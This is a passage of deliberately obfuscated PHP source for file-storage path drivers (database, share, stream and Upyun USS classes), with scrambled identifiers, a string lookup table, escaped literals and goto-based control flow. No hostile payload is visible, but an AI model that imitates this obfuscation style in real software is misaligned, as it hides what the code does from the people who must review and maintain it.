$DÍ‰º’¦ØÍ[$b÷ÒÖ‰½œª[164]][$b÷ÒÖ‰½œª[170]]; } public function exist($AÛèÙÇ¿) { $D–‰µƒÓˆô =& $_SERVER[úÉ·öƒÑì©]; $a’Üƒê“›Ò = $this->parse($AÛèÙÇ¿); if (!$a’Üƒê“›Ò[$D–‰µƒÓˆô[76]]) { return $this->isFile($AÛèÙÇ¿) || $this->isFolder($AÛèÙÇ¿); } $Bæè¨ÄÙµ‰ = array($D–‰µƒÓˆô[403] => $a’Üƒê“›Ò[$D–‰µƒÓˆô[402]], $D–‰µƒÓˆô[28] => $a’Üƒê“›Ò[$D–‰µƒÓˆô[76]]); $CÜ´ï¤ÉÍº = $this->model->where($Bæè¨ÄÙµ‰)->find(); return $CÜ´ï¤ÉÍº ? !0 : !1; } public function isFile($d³ğØƒ¡) { $dµßâ•²¹° =& $_SERVER[úÉ·öƒÑì©]; $D»êÁËã™ß = $this->infoSimple($d³ğØƒ¡); return $D»êÁËã™ß && $D»êÁËã™ß[$dµßâ•²¹°[412]] == $dµßâ•²¹°[87] ? !1 : !0; } public function isFolder($b˜ö¯‹Ûá‚) { $a­ÅÖ¯Ê‰Ë =& $_SERVER[úÉ·öƒÑì©]; $eïÅÙÃ±Œà = $this->infoSimple($b˜ö¯‹Ûá‚); return $eïÅÙÃ±Œà && $eïÅÙÃ±Œà[$a­ÅÖ¯Ê‰Ë[412]] == $a­ÅÖ¯Ê‰Ë[87] ? !0 : !1; } public function listPath($eƒ÷ÅœçÑˆ, $bÙò‚Æ ¬Œ = false) { $BÆ‰©š¨Ñ =& $_SERVER[úÉ·öƒÑì©]; if ($eƒ÷ÅœçÑˆ == $BÆ‰©š¨Ñ[33]) { return !1; } $bÅ’½¾Œˆ = array($BÆ‰©š¨Ñ[403] => $eƒ÷ÅœçÑˆ); if ($bÙò‚Æ ¬Œ) { return $this->model->listSource($bÅ’½¾Œˆ, -1); } return $this->model->listSource($bÅ’½¾Œˆ); } public function has($c¹·­’‡Äë, $f¬´ÀÂŒËç = false, $FÂ©ì¯®îŞ = null) { $b¥İÁ‚¼À‡ =& $_SERVER[úÉ·öƒÑì©]; $Fæ÷³ïÅÍĞ = $this->infoWithChildren($c¹·­’‡Äë); if ($f¬´ÀÂŒËç) { return array($b¥İÁ‚¼À‡[204] => $Fæ÷³ïÅÍĞ[$b¥İÁ‚¼À‡[204]], $b¥İÁ‚¼À‡[203] => $Fæ÷³ïÅÍĞ[$b¥İÁ‚¼À‡[203]]); } return $FÂ©ì¯®îŞ ? $Fæ÷³ïÅÍĞ[$b¥İÁ‚¼À‡[204]] : $Fæ÷³ïÅÍĞ[$b¥İÁ‚¼À‡[203]]; } public function listAll($BœÆ¸¦Š°–) { $f©Ë ±õ²§ = IO::info($this->pathParse[$_SERVER[úÉ·öƒÑì©][76]]); if (!$f©Ë ±õ²§) { return array(); } return $this->model->listAll($BœÆ¸¦Š°–); } public function getContent($b‘œÜÏÖ‚ƒ) { return $this->model->getContent($b‘œÜÏÖ‚ƒ); } public function setContent($D²Øê²¼Õ, $fáËÂŠÃõ = '') { return $this->model->setContent($D²Øê²¼Õ, $fáËÂŠÃõ); } public function fileSubstr($Aö›¦‘ñÕô, $a»øè¯³†³, $CóœÁ­Õ¢•) { return $this->model->fileSubstr($Aö›¦‘ñÕô, $a»øè¯³†³, $CóœÁ­Õ¢•); } public function download($b§µµĞâÃØ, $dƒä®‹ÎÕ‹ = '') { $AÓÄî­Ğ“İ = get_path_father($dƒä®‹ÎÕ‹); $f“ñØàå²ì = get_path_this($dƒä®‹ÎÕ‹); $cÍçŞ¯—˜ø = $this->model->fileInfoGet($b§µµĞâÃØ); $C±èÄ·‡¯Ï = IO::copy($cÍçŞ¯—˜ø[$_SERVER[úÉ·öƒÑì©][76]], $AÓÄî­Ğ“İ, !1, $f“ñØàå²ì); return $C±èÄ·‡¯Ï; } public function setModifyTime($C»™ì­¬£, $Dš–ŸÇ„± = '') { $DŞÉ«Ü—® =& $_SERVER[úÉ·öƒÑì©]; if (!$C»™ì­¬£) { return; } $this->model->where(array($DŞÉ«Ü—®[419] => $C»™ì­¬£))->save(array($DŞÉ«Ü—®[84] => $Dš–ŸÇ„±)); } public function upload($E¿‹ÃƒùÓ², $eÏ„ÍÂ‡â, $bëåğâ’ëÖ = false, $bæ¼ßÑÁñœ = REPEAT_REPLACE) { $Dá”ñ¥Å³ =& $_SERVER[úÉ·öƒÑì©]; $BØÄ­à† = $this->parse($E¿‹ÃƒùÓ²); $C´ŞñÛ«“’ = $this->model->addFile($BØÄ­à†[$Dá”ñ¥Å³[402]], $eÏ„ÍÂ‡â, $BØÄ­à†[$Dá”ñ¥Å³[76]], $bëåğâ’ëÖ, $bæ¼ßÑÁñœ); return $this->getPathOuter($C´ŞñÛ«“’); } public function uploadFileByID($a„Óáœí×‹, $c‰­î³Üäà, $fÁˆÑ…÷ğƒ) { $f¦¬Ô¡²ï× =& $_SERVER[úÉ·öƒÑì©]; $F‡’ÇÍ‚Ô = $this->parse($a„Óáœí×‹); $dÙˆ²½È£Ï = $this->model->addFileByFileID($F‡’ÇÍ‚Ô[$f¦¬Ô¡²ï×[402]], $c‰­î³Üäà, $F‡’ÇÍ‚Ô[$f¦¬Ô¡²ï×[76]], $fÁˆÑ…÷ğƒ); return $this->getPathOuter($dÙˆ²½È£Ï); } public function addFileByRemote($D¦åÔè’‚¹, $f¼“»–Ì¶, $fá­ÌŒäÙ = array(), $EÑ¬„«ê¥ = '', $d£½œ ˆ©õ) { $E‡²¼£Äœ¦ =& $_SERVER[úÉ·öƒÑì©]; $a…åÇœäÇ­ = $this->parse($D¦åÔè’‚¹); $EÑ¬„«ê¥ = empty($EÑ¬„«ê¥) ? $a…åÇœäÇ­[$E‡²¼£Äœ¦[76]] : $EÑ¬„«ê¥; $e’‰ø›ÚÄ = $this->model->addFileByRemote($a…åÇœäÇ­[$E‡²¼£Äœ¦[402]], $f¼“»–Ì¶, $EÑ¬„«ê¥, $fá­ÌŒäÙ, $d£½œ ˆ©õ); return $this->getPathOuter($e’‰ø›ÚÄ); } public function uploadLink($fâƒˆîî·Ç, $a“º¼åŸ¾· = 0) { $Fæ´ˆ’»æ =& $_SERVER[úÉ·öƒÑì©]; $f™ö‹‡¤ = $this->parse($fâƒˆîî·Ç); $båÎƒ’ä×Å = _get($GLOBALS[$Fæ´ˆ’»æ[7]], $Fæ´ˆ’»æ[1215]); $F‹Ê“Áî©‡ = _get($GLOBALS[$Fæ´ˆ’»æ[7]], $Fæ´ˆ’»æ[1216]); $fâƒˆîî·Ç = Model($Fæ´ˆ’»æ[580])->createFileName($f™ö‹‡¤[$Fæ´ˆ’»æ[76]], $båÎƒ’ä×Å, $F‹Ê“Áî©‡); return IO::uploadLink($fâƒˆîî·Ç, $a“º¼åŸ¾·); } public function fileNameAuto($A¥âĞè»‹, $FÚÔ§‰íïÆ, $CéË„Àä©° = REPEAT_REPLACE, $cìö©ÀÇ³ï = false) { return $this->model->fileNameAuto($A¥âĞè»‹, $FÚÔ§‰íïÆ, $CéË„Àä©°, $cìö©ÀÇ³ï); } public function fileNameExist($eø²¼‹›áš, $b‚Ô…É”ÕÜ) { return $this->model->fileNameExist($eø²¼‹›áš, $b‚Ô…É”ÕÜ); } protected function _fileOut($Bˆó¿©ä÷, $CªÍÕ‰§·Ø = false, $d½£ù†…µ = false, $AŞŒ‘õ¼•² = '', $A¿ÌØÆ³ = false) { goto dÄª‡Ğğ“”; dÄª‡Ğğ“”: $dì²Ò³¨° =& $_SERVER[úÉ·öƒÑì©]; $c¦åÕÑêÓª = $this->model->sourceInfo($Bˆó¿©ä÷); if ($c¦åÕÑêÓª[$dì²Ò³¨°[412]] == $dì²Ò³¨°[87]) { header($dì²Ò³¨°[1217]); die; } goto f©ÄƒÇãİÃ; b©¹›ºö´ò: if ($A¿ÌØÆ³) { return IO::fileOutServer($C¹çÁÎ·âß[$dì²Ò³¨°[76]], $CªÍÕ‰§·Ø, $b±óÎåŠŒğ, $AŞŒ‘õ¼•²); } IO::fileOut($C¹çÁÎ·âß[$dì²Ò³¨°[76]], $CªÍÕ‰§·Ø, $b±óÎåŠŒğ, $AŞŒ‘õ¼•²); goto e·Ø¢Ãä™Ê; f©ÄƒÇãİÃ: $C¹çÁÎ·âß = $this->model->fileInfoGet($Bˆó¿©ä÷); $AŞŒ‘õ¼•² = $C¹çÁÎ·âß[$dì²Ò³¨°[170]] ? $C¹çÁÎ·âß[$dì²Ò³¨°[170]] : $AŞŒ‘õ¼•²; $b±óÎåŠŒğ = isset($GLOBALS[$dì²Ò³¨°[1218]]) ? $GLOBALS[$dì²Ò³¨°[1218]] : $c¦åÕÑêÓª[$dì²Ò³¨°[28]]; goto b©¹›ºö´ò; e·Ø¢Ãä™Ê: } public function fileOut($AÇâ ç¦—, $fŞì««§ ¾ = false, $aÍ ’à © = false, $A®·ôèÜÊ¿ = '') { $this->_fileOut($AÇâ ç¦—, $fŞì««§ ¾, $aÍ ’à ©, $A®·ôèÜÊ¿); } public function fileOutServer($EŞ‘¨½ºÍ, $dÒç¬©¡¨Ç = false, $FÌ”ùÜ¬… = false, $DØäˆÒÉ¸¶ = '') { $this->_fileOut($EŞ‘¨½ºÍ, $dÒç¬©¡¨Ç, $FÌ”ùÜ¬…, $DØäˆÒÉ¸¶, !0); } protected function _fileOutImage($aÉá¡…‚À®, $bøÁÊÄì = 250) { goto Aµ ğñ‰ô‰; f§ƒ›Îá‡‚: $Aˆù³«öˆ¥ = $this->model->fileInfoGet($aÉá¡…‚À®); $Aˆù³«öˆ¥[$bäå¯ìøö÷[28]] = $B¼á²õª¥ã[$bäå¯ìøö÷[28]]; $Aˆù³«öˆ¥[$bäå¯ìøö÷[163]] = $B¼á²õª¥ã[$bäå¯ìøö÷[163]]; goto Dåƒ“È®Åœ; Aµ ğñ‰ô‰: $bäå¯ìøö÷ =& $_SERVER[úÉ·öƒÑì©]; $B¼á²õª¥ã = $this->model->pathInfo($aÉá¡…‚À®); if ($B¼á²õª¥ã[$bäå¯ìøö÷[412]] == $bäå¯ìøö÷[87]) { show_json($bäå¯ìøö÷[1219] . $aÉá¡…‚À®, !1); } goto f§ƒ›Îá‡‚; Dåƒ“È®Åœ: $GLOBALS[$bäå¯ìøö÷[1218]] = $Aˆù³«öˆ¥[$bäå¯ìøö÷[28]]; $GLOBALS[$bäå¯ìøö÷[162]] = $Aˆù³«öˆ¥; IO::fileOutImage($Aˆù³«öˆ¥[$bäå¯ìøö÷[76]], $bøÁÊÄì); goto b¬Ö‚ÔâõÉ; b¬Ö‚ÔâõÉ: } public function fileOutImage($cÁ·–İ°…², $cÛß™‹ô = 250) { $this->_fileOutImage($cÁ·–İ°…², $cÛß™‹ô); } public function fileOutImageServer($EåÎğƒï¨, $bƒ†ßê½É = 250) { $this->_fileOutImage($EåÎğƒï¨, $bƒ†ßê½É); } public function link($d—ˆèàˆ“, $BÃêà—îÔ‘ = '') { $BºôÚë…ÆÉ = $this->model->fileInfoGet($d—ˆèàˆ“); return IO::link($BºôÚë…ÆÉ[$_SERVER[úÉ·öƒÑì©][76]], $BÃêà—îÔ‘); } protected function parse($eÄ…ÍÑ»Šª) { $B’÷ƒ×Ñ”İ =& $_SERVER[úÉ·öƒÑì©]; if (strstr($eÄ…ÍÑ»Šª, $B’÷ƒ×Ñ”İ[8]) === !1) { return array($B’÷ƒ×Ñ”İ[421] => intval($eÄ…ÍÑ»Šª), $B’÷ƒ×Ñ”İ[76] => $B’÷ƒ×Ñ”İ[33], $B’÷ƒ×Ñ”İ[1214] => array()); } $dÆ×Ãö“Í = explode($B’÷ƒ×Ñ”İ[8], trim($eÄ…ÍÑ»Šª, $B’÷ƒ×Ñ”İ[8])); if (count($dÆ×Ãö“Í) < 2) { show_tips($eÄ…ÍÑ»Šª . $B’÷ƒ×Ñ”İ[1220]); } return array($B’÷ƒ×Ñ”İ[421] => intval($dÆ×Ãö“Í[0]), $B’÷ƒ×Ñ”İ[76] => $dÆ×Ãö“Í[1], $B’÷ƒ×Ñ”İ[1214] => array_slice($dÆ×Ãö“Í, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($B¿Î—ÂìƒÚ) { $this->pathParse = $B¿Î—ÂìƒÚ; $this->model = Model($_SERVER[úÉ·öƒÑì©][1213]); } public function getPathOuter($F‚ÀØñ½§ù) { $A²÷ç„ÓÌù =& $_SERVER[úÉ·öƒÑì©]; if (!$F‚ÀØñ½§ù) { return $F‚ÀØñ½§ù; } $FÆ¦°©³ì = $this->parse($F‚ÀØñ½§ù); return trim(KodIO::makeShare($this->pathParse[$A²÷ç„ÓÌù[402]], $FÆ¦°©³ì[$A²÷ç„ÓÌù[402]]), $A²÷ç„ÓÌù[8]); } protected function infoParse($d›Ì¿£ë‘, $fô÷£³«÷‰ = false, $f·Îš•ÂŸ­ = false) { $dìôÜÂôŠÉ =& $_SERVER[úÉ·öƒÑì©]; $fŠïù³çç = $this->pathParse[$dìôÜÂôŠÉ[402]]; $e´¸¤éé¿É = trim($this->pathParse[$dìôÜÂôŠÉ[1072]], $dìôÜÂôŠÉ[8]); return Action($dìôÜÂôŠÉ[1221])->sharePathInfo($fŠïù³çç, $e´¸¤éé¿É); } public function infoFull($AˆÒºâ³‘) { $EàîÓÔÃš =& $_SERVER[úÉ·öƒÑì©]; $e„–ÂÌÖ§á = explode($EàîÓÔÃš[8], trim($AˆÒºâ³‘, $EàîÓÔÃš[8])); if (count($e„–ÂÌÖ§á) > 1) { $A³•¶‹Ã¨´ = implode($EàîÓÔÃš[8], array_splice($e„–ÂÌÖ§á, 1)); $eª„ŸáŠ¶Á = $this->model->pathInfoByPath($e„–ÂÌÖ§á[0], $A³•¶‹Ã¨´); if (!$eª„ŸáŠ¶Á) { return !1; } $this->pathParse[$EàîÓÔÃš[1072]] = $eª„ŸáŠ¶Á[$EàîÓÔÃš[404]]; } return $this->infoParse($AˆÒºâ³‘); } public function listAll($FÀ–¯À‡åÊ) { goto fº½ÂÒİ©ç; BÎ¶£Šõñ: $cÃİéÊÖ›‘ = $this->model->listAll($FÀ–¯À‡åÊ); $dİ›—Ë™Ì = Model($Fº•Åå‚ñ[572])->getInfo($dïŠëÌùá[$Fº•Åå‚ñ[477]]); $b÷ÁëÏİ = Action($Fº•Åå‚ñ[1221]); goto EÆ„¬®¸Ñø; EÆ„¬®¸Ñø: foreach ($cÃİéÊÖ›‘ as &$fˆÔõš˜¡Í) { check_abort(); $fˆÔõš˜¡Í[$Fº•Åå‚ñ[85]] = $b÷ÁëÏİ->_shareItemeParse($fˆÔõš˜¡Í[$Fº•Åå‚ñ[85]], $dİ›—Ë™Ì); } unset($fˆÔõš˜¡Í); return $cÃİéÊÖ›‘; goto a›à²Ñ¸¡Œ; fº½ÂÒİ©ç: $Fº•Åå‚ñ =& $_SERVER[úÉ·öƒÑì©]; $dïŠëÌùá = IO::info($this->pathParse[$Fº•Åå‚ñ[76]]); if (!$dïŠëÌùá) { return array(); } goto BÎ¶£Šõñ; a›à²Ñ¸¡Œ: } } goto DŠ»µ…êŒ; C°²à«õ½Ü: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($EÅºóšÃª÷, $B×Õ¾Â«ê = 0) { parent::__construct(); $this->source = $EÅºóšÃª÷; $this->sourceSize = $B×Õ¾Â«ê; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($c¾¢ÊÈß‚ = false) { return $this->sourceSize; } public function getContent($D†èÆ¸–œ = false) { return $this->fileSubstr($D†èÆ¸–œ, 0, $this->sourceSize); } public function fileSubstr($Dµ¹öÜã¥† = false, $f…¶¡ ö…Ú = 0, $bÂŞ£ ìŒŞ = 0) { if (!$bÂŞ£ ìŒŞ) { $bÂŞ£ ìŒŞ = $this->sourceSize; } $D­ÂŸµŞ« = $this->sourceSize - $f…¶¡ ö…Ú; if ($bÂŞ£ ìŒŞ >= $D­ÂŸµŞ«) { $bÂŞ£ ìŒŞ = $D­ÂŸµŞ«; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $f…¶¡ ö…Ú, $bÂŞ£ ìŒŞ); } if ($this->sourceType == self::TYPE_FILE) { if ($bÂŞ£ ìŒŞ <= 0) { return $_SERVER[úÉ·öƒÑì©][33]; } $AÀ¸¶Õœê = ftell($this->source); fseek_64($this->source, $AÀ¸¶Õœê + $f…¶¡ ö…Ú); $bÁ’¾¢ì“æ = @fread($this->source, $bÂŞ£ ìŒŞ); fseek_64($this->source, $AÀ¸¶Õœê); return $bÁ’¾¢ì“æ; } } public function hashMd5($dŠÔ÷ôï = false) { return md5($this->getContent()); } public static function hash($E…ìÔƒ¥¬´, $e“¥’µ«¥ = 0) { $aÛ¾ô°²˜‚ = new PathDriverStream($E…ìÔƒ¥¬´, $e“¥’µ«¥); return $aÛ¾ô°²˜‚->hashSimple($E…ìÔƒ¥¬´); } public static function md5($AŒ¿Áè¼À«, $cÄá¬Õâà‹ = 0) { $fÎáö ƒ³¾ = new PathDriverStream($AŒ¿Áè¼À«, $cÄá¬Õâà‹); return $fÎáö ƒ³¾->hashMd5($AŒ¿Áè¼À«); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\72\x2f\57\166\x30\x2e\141\160\151\56\x75\x70\171\165\156\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($f‘ñ´Î™øå) { parent::__construct(); $this->_init($f‘ñ´Î™øå); } public function _init($BîÃ†©õ›¦) { $B™„®Ã§¨Ğ =& $_SERVER[úÉ·öƒÑì©]; foreach ($BîÃ†©õ›¦ as $B¨†ÓÌÒõ => $b°ÕŸù) { if (isset($this->{$B¨†ÓÌÒõ})) { $this->{$B¨†ÓÌÒõ} = $b°ÕŸù; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($B™„®Ã§¨Ğ[1337] . LNG($B™„®Ã§¨Ğ[1269])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($aÍÔ‰ Ì¯, $CŠ÷¸…Ö£º = "\x47\105\x54") { $bÃÛãùù» =& $_SERVER[úÉ·öƒÑì©]; $A•°ĞøÅÊ¯ = gmdate($bÃÛãùù»[1303]); $fÔÈĞÒëíê = base64_encode(hash_hmac($bÃÛãùù»[1338], "{$CŠ÷¸…Ö£º}\x26{$aÍÔ‰ Ì¯}\46{$A•°ĞøÅÊ¯}", md5("{$this->userpass}"), !0)); $CàÃ‘Ü¿¢ß = array("\101\165\164\150\x6f\x72\x69\172\x61\164\x69\157\x6e\72\125\120\x59\x55\x4e\40{$this->username}\72{$fÔÈĞÒëíê}", "\104\141\x74\145\72{$A•°ĞøÅÊ¯}"); return $CàÃ‘Ü¿¢ß; } public function ussRequest($AÒñÁ¶Şœ, $AÅ£óƒİÁª = "\x47\x45\124", $dÒ·È˜»Âå = false, $AãÇ­¦Ğ‘ = false, $DØÕ·×İ÷Ã = false) { goto FÚŸáƒ„¬; FÍìéÅÄ›: if (!$dãôä”œ¾Ü) { return array($c²åÁØàË[1094] => !1, $c²åÁØàË[1096] => $c²åÁØàË[1339]); } if (strtolower($AÅ£óƒİÁª) == $c²åÁØàË[190] || in_array($dãôä”œ¾Ü[$c²åÁØàË[1094]], array($c²åÁØàË[1196], $c²åÁØàË[1340]))) { $dÒ·È˜»Âå = $dãôä”œ¾Ü[$c²åÁØàË[1341]]; } else { $dÒ·È˜»Âå = json_decode($dãôä”œ¾Ü[$c²åÁØàË[1096]], !0); if (!$dÒ·È˜»Âå) { $dÒ·È˜»Âå = $dãôä”œ¾Ü[$c²åÁØàË[1096]]; } else { if (!$dãôä”œ¾Ü[$c²åÁØàË[726]] && isset($dÒ·È˜»Âå[$c²åÁØàË[1342]])) { $dÒ·È˜»Âå = $dÒ·È˜»Âå[$c²åÁØàË[1342]]; } } } return array($c²åÁØàË[1094] => $dãôä”œ¾Ü[$c²åÁØàË[726]], $c²åÁØàË[1096] => $dÒ·È˜»Âå); goto A±ó½ğ¸’á; f÷Ç©µñ²: $D£˜å·ç… = $this->ussHeaders($E”ùóÀ‰°à, $AÅ£óƒİÁª); if ($AãÇ­¦Ğ‘) { $D£˜å·ç… = array_merge($D£˜å·ç…, $AãÇ­¦Ğ‘); } $dãôä”œ¾Ü = url_request($this->endpoint . $E”ùóÀ‰°à, $AÅ£óƒİÁª, $dÒ·È˜»Âå, $D£˜å·ç…, $DØÕ·×İ÷Ã); goto FÍìéÅÄ›; FÚŸáƒ„¬: $c²åÁØàË =& $_SERVER[úÉ·öƒÑì©]; $AÒñÁ¶Şœ = trim($AÒñÁ¶Şœ, $c²åÁØàË[8]); $E”ùóÀ‰°à = "\x2f{$this->bucket}\57{$AÒñÁ¶Şœ}"; goto f÷Ç©µñ²; A±ó½ğ¸’á: } public function mkfile($F“§¦‚¯ğ, $f¥‘²Ö™ê„ = '', $Aæ§±ËÍ±© = REPEAT_RENAME) { if ($this->setContent($F“§¦‚¯ğ, $f¥‘²Ö™ê„)) { return $this->getPathOuter($F“§¦‚¯ğ); } return !1; } public function mkdir($e˜¸æ¥…ò’, $FÄÌç¬ˆßƒ = REPEAT_SKIP) { $b­ÑÁ²êºğ =& $_SERVER[úÉ·öƒÑì©]; $e©®ª¡Î§ = trim($e˜¸æ¥…ò’, $b­ÑÁ²êºğ[8]); if ($this->_isFolder($e©®ª¡Î§)) { return $this->getPathOuter($e©®ª¡Î§); } $FšÜ‹‡¿ó‡ = array($b­ÑÁ²êºğ[1343]); $b›œé„¶¸Æ = $this->ussRequest($e©®ª¡Î§, $b­ÑÁ²êºğ[224], !1, $FšÜ‹‡¿ó‡); return $b›œé„¶¸Æ[$b­ÑÁ²êºğ[1094]] ? $this->getPathOuter($e©®ª¡Î§) : !1; } public function copyFile($cÜ­ùÙ, $D¨Âæƒë™©) { $f–¡ƒ·„« =& $_SERVER[úÉ·öƒÑì©]; $B—™¿‰æğ´ = array($f–¡ƒ·„«[1344] . "\x2f{$this->bucket}\57{$cÜ­ùÙ}", $f–¡ƒ·„«[1345]); $E‰é†ğéö = $this->ussRequest($D¨Âæƒë™©, $f–¡ƒ·„«[226], !1, $B—™¿‰æğ´); return $E‰é†ğéö[$f–¡ƒ·„«[1094]] ? !0 : $this->getPathOuter($D¨Âæƒë™©); } public function moveFile($A¹…Â¿Äò, $bÙÛªŒ¼çã) { $EËäÏõ¥æà =& $_SERVER[úÉ·öƒÑì©]; $FöŞÇ©ù”Ø = array($EËäÏõ¥æà[1346] . "\x2f{$this->bucket}\x2f{$A¹…Â¿Äò}", $EËäÏõ¥æà[1345]); $dµƒçİ¾Ÿ = $this->ussRequest($bÙÛªŒ¼çã, $EËäÏõ¥æà[226], !1, $FöŞÇ©ù”Ø); return $dµƒçİ¾Ÿ[$EËäÏõ¥æà[1094]] ? !0 : $this->getPathOuter($bÙÛªŒ¼çã); } public function delFile($Eˆ¿Ï™ò‡) { $E‡ÉÏ‡—¶ =& $_SERVER[úÉ·öƒÑì©]; $E²²´Î»«Ù = $this->ussRequest($Eˆ¿Ï™ò‡, $E‡ÉÏ‡—¶[1347]); return $E²²´Î»«Ù[$E‡ÉÏ‡—¶[1094]] ? !0 : !1; } public function delFolder($eÔô•¬¤‰†) { goto DÉ’çä‹Ô; FÈ«˜¶ó“ì: $f›êˆâ¬ùÑ = $d§òÖ›õ¶ = array(); $this->fileList($eÔô•¬¤‰†, $f›êˆâ¬ùÑ, $d§òÖ›õ¶, !0); $this->listItemCache = !0; goto dÚì×Ôì’; dÚì×Ôì’: foreach ($d§òÖ›õ¶ as $Aï¹°´êÚ) { $b³ÕÌ‡É× = $this->ussRequest($Aï¹°´êÚ[$aÕÙ”é¼…[28]], $aÕÙ”é¼…[1347]); if (!$b³ÕÌ‡É×[$aÕÙ”é¼…[1094]]) { return !1; } } foreach ($f›êˆâ¬ùÑ as $fĞêâåŸÏ˜) { $b³ÕÌ‡É× = $this->ussRequest($fĞêâåŸÏ˜, $aÕÙ”é¼…[1347]); if (!$b³ÕÌ‡É×[$aÕÙ”é¼…[1094]]) { return !1; } } $b³ÕÌ‡É× = $this->ussRequest($eÔô•¬¤‰†, $aÕÙ”é¼…[1347]); goto Dä¦î¥µµ; DÉ’çä‹Ô: $aÕÙ”é¼… =& $_SERVER[úÉ·öƒÑì©]; if (!$this->exist($eÔô•¬¤‰†)) { return !0; } $this->listItemCache = !1; goto FÈ«˜¶ó“ì; Dä¦î¥µµ: return $b³ÕÌ‡É×[$aÕÙ”é¼…[1094]]; goto bÏ‘Ë˜ä‹“; bÏ‘Ë˜ä‹“: } public function rename($f‘ËâÛÜŒ°, $C¸¦ÚÜİÇì) { if ($this->isFile($f‘ËâÛÜŒ°)) { $C¸¦ÚÜİÇì = get_path_father($f‘ËâÛÜŒ°) . $C¸¦ÚÜİÇì; return $this->moveFile($f‘ËâÛÜŒ°, $C¸¦ÚÜİÇì); } return $this->renameObject($f‘ËâÛÜŒ°, $C¸¦ÚÜİÇì); } public function fileInfo($Eøùù÷õÑ, $B‹¯Ï³ªì¢ = false, $a§†È™ï™‘ = array()) { goto CÑ‚Ã¾âÎç; AºÌî­´ÃŒ: $c©½‰‘˜×[$fÄ«ÃİÏò‡[194]] = $c©½‰‘˜×[$fÄ«ÃİÏò‡[84]] = 0; $c©½‰‘˜×[$fÄ«ÃİÏò‡[195]] = $c©½‰‘˜×[$fÄ«ÃİÏò‡[196]] = !0; if (empty($a§†È™ï™‘)) { $a§†È™ï™‘ = $this->objectMeta($Eøùù÷õÑ); if (!$a§†È™ï™‘) { return $c©½‰‘˜×; } } goto c‚ïƒ¥ºøÌ; C‹ñ„­ËÏœ: return $c©½‰‘˜×; goto d…öš§”š‰; c‚ïƒ¥ºøÌ: $c©½‰‘˜×[$fÄ«ÃİÏò‡[194]] = intval($a§†È™ï™‘[$fÄ«ÃİÏò‡[1348]]); $c©½‰‘˜×[$fÄ«ÃİÏò‡[84]] = intval($a§†È™ï™‘[$fÄ«ÃİÏò‡[1349]]); $c©½‰‘˜×[$fÄ«ÃİÏò‡[78]] = $a§†È™ï™‘[$fÄ«ÃİÏò‡[78]]; goto C‹ñ„­ËÏœ; CÑ‚Ã¾âÎç: $fÄ«ÃİÏò‡ =& $_SERVER[úÉ·öƒÑì©]; $c©½‰‘˜× = array($fÄ«ÃİÏò‡[28] => $this->pathThis($Eøùù÷õÑ), $fÄ«ÃİÏò‡[76] => $this->getPathOuter($fÄ«ÃİÏò‡[8] . $Eøùù÷õÑ), $fÄ«ÃİÏò‡[29] => $fÄ«ÃİÏò‡[193], $fÄ«ÃİÏò‡[78] => isset($a§†È™ï™‘[$fÄ«ÃİÏò‡[78]]) ? $a§†È™ï™‘[$fÄ«ÃİÏò‡[78]] : 0, $fÄ«ÃİÏò‡[168] => $this->ext($Eøùù÷õÑ)); if ($B‹¯Ï³ªì¢) { return $c©½‰‘˜×; } goto AºÌî­´ÃŒ; d…öš§”š‰: } public function folderInfo($e¶ Œ–¼¿ƒ, $Fè¾âÈÕ· = false) { goto aã³—òã£É; fíàä¢’åª: $F¼´ĞœÒ¯õ[$F¸‘öŠÉŸç[194]] = $F¼´ĞœÒ¯õ[$F¸‘öŠÉŸç[84]] = 0; $F¼´ĞœÒ¯õ[$F¸‘öŠÉŸç[195]] = $F¼´ĞœÒ¯õ[$F¸‘öŠÉŸç[196]] = !0; if (empty($eÓ¶æ‡§³â)) { $eÓ¶æ‡§³â = $this->objectMeta($e¶ Œ–¼¿ƒ); if (!$eÓ¶æ‡§³â) { return $F¼´ĞœÒ¯õ; } } goto AÀ» äğ¾; aã³—òã£É: $F¸‘öŠÉŸç =& $_SERVER[úÉ·öƒÑì©]; $F¼´ĞœÒ¯õ = array($F¸‘öŠÉŸç[28] => $this->pathThis($e¶ Œ–¼¿ƒ), $F¸‘öŠÉŸç[76] => $this->getPathOuter($F¸‘öŠÉŸç[8] . $e¶ Œ–¼¿ƒ), $F¸‘öŠÉŸç[29] => $F¸‘öŠÉŸç[77]); if ($Fè¾âÈÕ·) { return $F¼´ĞœÒ¯õ; } goto fíàä¢’åª; AÀ» äğ¾: $F¼´ĞœÒ¯õ[$F¸‘öŠÉŸç[194]] = intval($eÓ¶æ‡§³â[$F¸‘öŠÉŸç[1348]]); $F¼´ĞœÒ¯õ[$F¸‘öŠÉŸç[84]] = intval($eÓ¶æ‡§³â[$F¸‘öŠÉŸç[1349]]); return $F¼´ĞœÒ¯õ; goto bÀ „µå”ˆ; bÀ „µå”ˆ: } private function listObjs($fê¨öİšµŠ, $Eèï„Ê¹¨ì = 0, $BëÂì±¿ä¶ = 1000) { $bæìÆ”Ú÷ =& $_SERVER[úÉ·öƒÑì©]; $Aµµ…³¶œ« = array($bæìÆ”Ú÷[1350], $bæìÆ”Ú÷[1351] . $BëÂì±¿ä¶); if ($Eèï„Ê¹¨ì) { $Aµµ…³¶œ«[] = $bæìÆ”Ú÷[1352] . $Eèï„Ê¹¨ì; } $c„î¹Âàµ = $this->ussRequest($fê¨öİšµŠ, $bæìÆ”Ú÷[228], !1, $Aµµ…³¶œ«); return !$c„î¹Âàµ[$bæìÆ”Ú÷[1094]] ? !1 : $c„î¹Âàµ[$bæìÆ”Ú÷[1096]]; } private function fileList($a†””Ì, &$b µÏ¿‰‰À, &$E ğÄÙøò, $eÉ™›Ø•¾„ = false) { goto aÄ®ÀÕµÀô; aÄ®ÀÕµÀô: $b‰‰¶öê =& $_SERVER[úÉ·öƒÑì©]; 